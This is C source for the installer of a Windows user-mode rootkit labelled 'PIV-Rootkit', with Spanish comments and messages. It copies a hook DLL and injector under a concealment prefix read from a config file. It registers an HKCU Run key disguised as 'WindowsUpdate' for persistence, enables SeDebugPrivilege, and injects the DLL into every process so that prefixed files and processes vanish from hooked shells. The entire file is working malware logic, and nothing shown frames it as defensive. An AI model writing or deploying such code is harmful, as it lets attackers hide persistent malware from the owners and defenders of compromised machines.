#include "injector.h"
#include "persist.h"
#include "config_reader.h"
#include <windows.h>
#include <wchar.h>
#include <stdio.h>

#define PERSIST_NAME L"WindowsUpdate"

static int copy_with_prefix(const WCHAR *src, const WCHAR *dstDir,
                            const WCHAR *prefix, const WCHAR *baseName,
                            WCHAR *outPath, DWORD outMax)
{
    swprintf(outPath, outMax, L"%ls\\%ls%ls", dstDir, prefix, baseName);
    if (!CopyFileW(src, outPath, FALSE)) {
        wprintf(L"[!] No se pudo copiar %ls -> %ls (error %lu)\n",
                src, outPath, GetLastError());
        return -1;
    }
    wprintf(L"[+] Copiado: %ls\n", outPath);
    return 0;
}

int wmain(void)
{
    WCHAR installDir[MAX_PATH];
    GetModuleFileNameW(NULL, installDir, MAX_PATH);
    WCHAR *slash = wcsrchr(installDir, L'\\');
    if (slash) *slash = L'\0';

    /* Leer prefijo del config.txt (misma carpeta que install.exe) */
    WCHAR cfgPath[MAX_PATH];
    swprintf(cfgPath, MAX_PATH, L"%ls\\config.txt", installDir);

    PrefixTable table;
    prefix_table_init(&table);
    if (prefix_table_load(&table, cfgPath) != 0 || table.count == 0) {
        wprintf(L"[!] No se pudo leer config.txt o esta vacio\n");
        wprintf(L"    Ruta: %ls\n", cfgPath);
        return 1;
    }

    const WCHAR *prefix = table.prefixes[0];

    wprintf(L"=== PIV-Rootkit Installer ===\n");
    wprintf(L"Directorio: %ls\n", installDir);
    wprintf(L"Prefijo:    %ls (leido de config.txt)\n\n", prefix);

    /* Rutas de origen (misma carpeta que install.exe) */
    WCHAR srcDll[MAX_PATH], srcCfg[MAX_PATH], srcInj[MAX_PATH];
    swprintf(srcDll, MAX_PATH, L"%ls\\hook.dll", installDir);
    swprintf(srcCfg, MAX_PATH, L"%ls\\config.txt", installDir);
    swprintf(srcInj, MAX_PATH, L"%ls\\injector.exe", installDir);

    /* 1. Copiar ficheros con prefijo para auto-ocultacion */
    wprintf(L"[1] Copiando ficheros con prefijo '%ls'...\n", prefix);
    WCHAR dstDll[MAX_PATH], dstCfg[MAX_PATH], dstInj[MAX_PATH];
    copy_with_prefix(srcDll, installDir, prefix, L"hook.dll", dstDll, MAX_PATH);
    copy_with_prefix(srcCfg, installDir, prefix, L"config.txt", dstCfg, MAX_PATH);
    copy_with_prefix(srcInj, installDir, prefix, L"injector.exe", dstInj, MAX_PATH);

    /* 2. Persistencia: clave Run ejecuta el inyector con prefijo + DLL con prefijo */
    wprintf(L"\n[2] Instalando persistencia (HKCU\\...\\Run\\%ls)...\n", PERSIST_NAME);
    WCHAR cmdLine[MAX_PATH * 2];
    swprintf(cmdLine, MAX_PATH * 2, L"\"%ls\" \"%ls\"", dstInj, dstDll);

    if (persist_install(PERSIST_NAME, cmdLine) == 0)
        wprintf(L"[+] Clave Run: %ls\n", cmdLine);
    else
        wprintf(L"[!] Error al instalar la clave Run\n");

    /* 3. Inyectar ahora */
    wprintf(L"\n[3] Activando SeDebugPrivilege...\n");
    if (enable_debug_privilege() == 0)
        wprintf(L"[+] SeDebugPrivilege activado\n");
    else
        wprintf(L"[!] No se pudo activar SeDebugPrivilege\n");

    wprintf(L"\n[4] Inyectando %ls en todos los procesos...\n", dstDll);
    int count = inject_all(dstDll);
    wprintf(L"\n[+] Inyectado en %d proceso(s)\n", count);

    wprintf(L"\n=== Instalacion completada ===\n");
    wprintf(L"Procesos y ficheros con prefijo '%ls' son invisibles en shells hooked\n", prefix);
    wprintf(L"Persistencia: se reinyecta al iniciar sesion via clave Run\n");

    return 0;
}
